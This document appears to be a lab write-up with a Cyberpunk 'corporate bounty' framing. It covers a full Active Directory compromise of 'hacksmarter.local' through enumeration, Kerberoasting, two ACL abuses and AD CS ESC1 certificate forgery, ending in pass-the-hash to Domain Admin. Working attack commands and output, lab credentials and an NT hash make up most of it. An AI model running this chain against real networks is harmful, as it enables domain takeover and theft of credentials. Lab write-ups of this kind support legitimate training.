---
title: "Mission: Arasaka"
date: 2026-09-21
draft: false
tags: ["active-directory", "bloodhound", "kerberoasting", "acl-abuse", "ad-cs", "privilege-escalation"]
math: false
cover: ""
toc: true
description: "Another day in Night City."
---

Job type: Bounty
 
Target: Arasaka Corporation

Brief was short, a corpo spy reached out to a broker across the wire, they had got their hands on a low priv account for the Arasaka Corporation.
The objective, compromise the network infrastructure and ensure that they could come in through the gates undetected later.  Promise of more work down the road, more challenging.. well paying work. 
First though, I was to prove I am capable. What a joke, I will show them how capable I am. 

---

## Phase 0 - The Intel Package

No initial exploitation. Client handed over a live domain account on day one along with access to a corperate VPN. This is the only initial access that was given, it was all that was needed.
I'm a professional after all.

```
Target IP: 10.0.17.23
Creds: faraday:hacksmarter123
```

`faraday`. This is our starting access, from here, I will case their environment and see what I am working with. 

---

## Phase 1 - Casing the Infrastructure

Full port sweep first, know the target before touching anything else. Don't want any nasty surprises. 

```bash
nmap -sVC -A -T4 "$TARGET"_full_ports "$TARGET"
```

Based on recon, it looks like we have initial access to a domain controller out of the gate:

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-21 14:28:23Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

RDP banner gave us a hostname and domain:

```
rdp-ntlm-info:
  Target_Name:        HACKSMARTER
  NetBIOS_Domain_Name: HACKSMARTER
  NetBIOS_Computer_Name: DC01
  DNS_Domain_Name:    hacksmarter.local
  DNS_Computer_Name:  DC01.hacksmarter.local
  Product_Version:    10.0.20348
```

`DC01.hacksmarter.local`, Windows Server 2022, SMB signing enforced.

I added it to the local resolver:

```bash
sudo nano /etc/hosts
```
```
10.0.17.23 hacksmarter.local DC01.hacksmarter.local
```

---

## Phase 2 - Trust, but Verify
Sometimes clients make typos, or a bit gets misplaced here and there in transmission, before anything we need to verify the account that was given to us:


```bash
nxc smb hacksmarter.local -u faraday -p 'hacksmarter123'
```

```
SMB   10.0.17.23  445  DC01  [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB   10.0.17.23  445  DC01  [+] hacksmarter.local\faraday:hacksmarter123
```

Access verified. Now let's see what we can do with it. 

### Share enumeration

```bash
nxc smb hacksmarter.local -u faraday -p 'hacksmarter123' --shares
```

Default shares only: `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`. Nothing out of the ordinary.

### Walking the directory

```bash
nxc smb hacksmarter.local -u faraday -p 'hacksmarter123' --users
```

Fifteen accounts came back, named for Arasaka's org chart: Goro, Yorinobu, Hanako, Faraday, Smasher, Hellman, Oda, `the_emperor`, plus four service accounts: `alt.svc`, `Soulkiller.svc`, `kei.svc`, `Silverhand.svc`. A few had descriptions worth noting:

```
Goro           — Loyal to a fault
alt.svc        — Trapped for eternity
Hanako         — Waiting at embers
Soulkiller.svc — Certificate managment for soulkiller AI
kei.svc        — Trapped for eternity
Silverhand.svc — Trapped for eternity
```

`Soulkiller.svc` doing certificate management was worth flagging early. Service accounts tied to PKI are usually worth a second look. Aside from that, some rather creepy notes on these accounts. 

### RID brute force

Full account enumeration by RID, just to make sure:

```bash
nxc smb hacksmarter.local -u faraday -p 'hacksmarter123' --rid-brute | grep -ia SidTypeUser
```

Confirmed all fifteen users plus the machine account `DC01$`. Let's get this cleaned up into a target list:

```bash
cat a.txt | cut -d '\' -f 2 | cut -d '(' -f 1 > users.txt
```

### Password policy recon

```bash
nxc smb hacksmarter.local -u faraday -p 'hacksmarter123' --pass-pol
```

```
Minimum password length: 5
Password Complexity Flags: 000000
Domain Password Complex: 0
Account Lockout Threshold: None
```

No complexity enforcement or lockout threshold. Weak passwords were going to be a viable possibility. When people aren't held to standards, they get lazy. It's in our nature, which is good for me. No vulnerability is a lower hanging fruit that a human.

### LDAP and the domain dump

```bash
nxc ldap hacksmarter.local -u faraday -p 'hacksmarter123' --users
```

Full LDAP dump for group relationships:

```bash
DOMAIN=DC01.hacksmarter.local
USER=faraday
PASSWORD=hacksmarter123
DC_HOST=10.0.17.23

ldapdomaindump --user "$DOMAIN"\\"$USER" --password "$PASSWORD" --outdir ldapdomaindump "$DC_HOST"
```

```
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

`Domain Admins` had two members: `Administrator` and `the_emperor`, which the directory listed as **Saburo Arasaka**, still logged in as a live account. `Yorinobu` sat in `Remote Management Users` and `Remote Desktop Users`, meaning direct machine access. `Soulkiller.svc` turned up again, description confirming certificate management for the "soulkiller AI," tied to a computer object at `AI/blackwall.hacksmarter.local`.

A PKI service account named after the wall meant to keep rogue AI out. Interesting.

### RPC - a dead end

```bash
rpcclient -U 'faraday' hacksmarter.local
```

Same user list and domain info back (`ROLE_DOMAIN_PDC`, 49 total users). No new data, but best to measure twice, cut once.

### BloodHound

Enough names. Time to map the actual relationships between them.

```bash
neo4j start
mkdir bloodhound && cd bloodhound
rusthound -d hacksmarter.local -u "$USER" -p "$PASSWORD" -n "$TARGET" -o . --zip
```

```
[rusthound::json::maker] 16 users parsed!
[rusthound::json::maker] 60 groups parsed!
[rusthound::json::maker] ./20260921121533_hacksmarter-local_rusthound.zip created!
RustHound Enumeration Completed at 12:15:33 on 09/21/26! Happy Graphing!
```

Loaded into BloodHound CE. A path was already standing out:

```
alt.svc  --GenericAll-->  Yorinobu  --GenericWrite-->  Soulkiller.svc
```

`alt.svc` held `GenericAll` over `Yorinobu`. `Yorinobu` held `GenericWrite` over `Soulkiller.svc`. A direct chain from a low-value service account to the account managing the domain's certificate infrastructure. Not great for them, fantastic for me.

---

## Phase 3 - Executing the Chain

### Step 1: Kerberoasting alt.svc

`alt.svc` had a registered SPN, which makes it Kerberoastable: request a ticket, crack offline, no repeated auth attempts against the DC to trigger any defences.

```bash
mkdir krb && cd krb
nxc ldap hacksmarter.local -u faraday -p 'hacksmarter123' --kerberoast ker_hashes.txt
```

Got a `$krb5tgs$23$...` hash for `alt.svc`. Cracked with John:

```bash
john ker_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```
babygirl1        (?)
1g 0:00:00:00 DONE (2026-09-21 12:35) 33.33g/s ...
Session completed
```

**Creds: `alt.svc:babygirl1`**

Validated:

```bash
nxc smb hacksmarter.local -u alt.svc -p 'babygirl1' --shares
```

```
SMB  10.0.17.23  445  DC01  [+] hacksmarter.local\alt.svc:babygirl1
```

First account down. On to the next.

### Step 2: GenericAll into Yorinobu

`alt.svc` had `GenericAll` over `Yorinobu`. That means we have full control, meaning a direct password reset is viable.

```bash
net rpc password "yorinobu" "hacked" -U "hacksmarter.local"/"alt.svc"%"babygirl1" -S $TARGET
```

No output, which for this command means success. Confirmed:

```bash
nxc smb hacksmarter.local -u yorinobu -p 'hacked' --shares
```

```
SMB  10.0.17.23  445  DC01  [+] hacksmarter.local\yorinobu:hacked
```

BloodHound had already flagged Yorinobu's membership in `Remote Management Users`, meaning this credential gets a shell directly on the DC.

```bash
evil-winrm -i hacksmarter.local -u Yorinobu -p 'hacked'
```

```
*Evil-WinRM* PS C:\Users\Yorinobu\Documents> whoami
hacksmarter\yorinobu
*Evil-WinRM* PS C:\Users\Yorinobu\Documents> hostname
DC01
```

Shell on the domain controller, it's not looking good for our chums over at Arasaka right about now, wonder whose head on a platter will be served when their forensics team finally understands what happened. Feel bad for their netrunners on one hand, on the other, they knew what they signed up for.

```bash
whoami /all
```

```
hacksmarter\yorinobu   S-1-5-21-3154413470-3340737026-2748725799-1117

BUILTIN\Remote Desktop Users
BUILTIN\Remote Management Users
BUILTIN\Certificate Service DCOM Access
```

`Certificate Service DCOM Access` confirmed the next target: the CA.

### Step 3: Pulling Soulkiller.svc's ticket

`Yorinobu` held `GenericWrite` over `Soulkiller.svc`, enough to force a Kerberoastable SPN onto an account that didn't have one by default, a targeted Kerberoast against one specific account instead of a domain-wide sweep.

```bash
git clone https://github.com/ShutdownRepo/targetedKerberoast
cd targetedKerberoast
pip install -r requirements.txt
targetedKerberoast.py -v -d 'hacksmarter.local' -u 'yorinobu' -p 'hacked'
```

```
[VERBOSE] SPN added successfully for (Soulkiller.svc)
[+] Printing hash for (Soulkiller.svc)
$krb5tgs$23$*Soulkiller.svc$HACKSMARTER.LOCAL$hacksmarter.local/Soulkiller.svc*$...
[VERBOSE] SPN removed successfully for (Soulkiller.svc)
```

SPN removed automatically after the hash was pulled, no leftover config changes.

Cracked the same way:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt soulkiller.txt
```

```
MYpassword123#   (?)
1g 0:00:00:05 DONE (2026-09-21 12:57) 0.1739g/s ...
Session completed
```

**Creds: `Soulkiller.svc:MYpassword123#`**

Validated:

```bash
nxc smb hacksmarter.local -u soulkiller.svc -p 'MYpassword123#' --shares
```

```
SMB  10.0.17.23  445  DC01  [+] hacksmarter.local\soulkiller.svc:MYpassword123#
```

Access to the certificate management account.

---

## Phase 4 - I see a crack in the blackwall

`Soulkiller.svc` exists for certificate management, so the next step was checking what that account can actually do against the CA.

```bash
certipy find -u 'soulkiller.svc@hacksmarter.local' -p 'MYpassword123#' -stdout -vulnerable -dc-ip $TARGET
```

CA name: `hacksmarter-DC01-CA`. One enabled template stood out immediately:

```
Template Name : AI_Takeover
Enrollee Supplies Subject : True
Certificate Name Flag : EnrolleeSuppliesSubject
Client Authentication : True
Enrollment Rights : HACKSMARTER.LOCAL\Soulkiller.svc
```

```
[!] Vulnerabilities
    ESC1 : Enrollee supplies subject and template allows client authentication.
```

**ESC1.** Requester can name any subject, template allows client auth, and `Soulkiller.svc` has enrollment rights. That's enough to mint a certificate for any identity in the domain, and mint we will.

### Choosing what face to wear

Only one target made sense: the account at the top of `Domain Admins`.

```bash
certipy account -u 'soulkiller.svc@hacksmarter.local' -p 'MYpassword123#' -dc-ip $TARGET -user 'the_emperor' read
```

```
cn                 : Saburo Arasaka
distinguishedName  : CN=Saburo Arasaka,CN=Users,DC=hacksmarter,DC=local
sAMAccountName     : the_emperor
userPrincipalName  : the_emperor@hacksmarter.local
```

**SID: `S-1-5-21-3154413470-3340737026-2748725799-1601`**

### Forging the certificate

```bash
certipy req -u soulkiller.svc -p 'MYpassword123#' -ca hacksmarter-DC01-CA \
  -target hacksmarter.local -template AI_Takeover -upn the_emperor@hacksmarter.local \
  -sid S-1-5-21-3154413470-3340737026-2748725799-1601
```

```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Got certificate with UPN 'the_emperor@hacksmarter.local'
[*] Certificate object SID is 'S-1-5-21-3154413470-3340737026-2748725799-1601'
[*] Saving certificate and private key to 'the_emperor.pfx'
```

CA signed it without validation. As far as the PKI was concerned, this was now `the_emperor`. I WAS NOW the Emperor.

### Cashing it in

```bash
certipy auth -pfx the_emperor.pfx -dc-ip $TARGET
```

```
[*] SAN UPN: 'the_emperor@hacksmarter.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Got hash for 'the_emperor@hacksmarter.local':
aad3b435b51404eeaad3b435b51404ee:d87640b0d83dc7f90f5f30bd6789b133
```

Full TGT and NT hash for the founder's account, off a certificate the domain's own CA issued without question. Ironic, isn't it?

---

## Phase 5 - Claiming my rightful place at the throne

```bash
evil-winrm -i hacksmarter.local -u the_emperor -H d87640b0d83dc7f90f5f30bd6789b133
```

```
*Evil-WinRM* PS C:\Users\the_emperor\Documents> whoami
hacksmarter\the_emperor
*Evil-WinRM* PS C:\Users\the_emperor\Documents> hostname
DC01
```

Confirmed:

```bash
whoami /all
```

```
hacksmarter\the_emperor   S-1-5-21-3154413470-3340737026-2748725799-1601

HACKSMARTER\Domain Admins       S-1-5-21-3154413470-3340737026-2748725799-512
BUILTIN\Administrators
SeDebugPrivilege                Enabled
SeEnableDelegationPrivilege     Enabled
SeBackupPrivilege                Enabled
SeRestorePrivilege                Enabled
```

Domain Admin, full privilege set, DC01.

---

## Run Debrief

1. **Assumed breach foothold** (`faraday`) → domain recon over SMB/LDAP/RPC
2. **Kerberoasting** a weak service-account password (`alt.svc` → `babygirl1`)
3. **ACL abuse #1** — `GenericAll` → password reset onto `Yorinobu`
4. **ACL abuse #2** — `GenericWrite` → targeted Kerberoast onto `Soulkiller.svc`
5. **AD CS ESC1** — forged a certificate as `the_emperor` (Domain Admin) via a template that allowed the requester to supply their own subject
6. **Domain Admin** via `certipy auth` → NT hash → WinRM

All that money, and they didn't last but minutes. Guess money really can't replace skill.
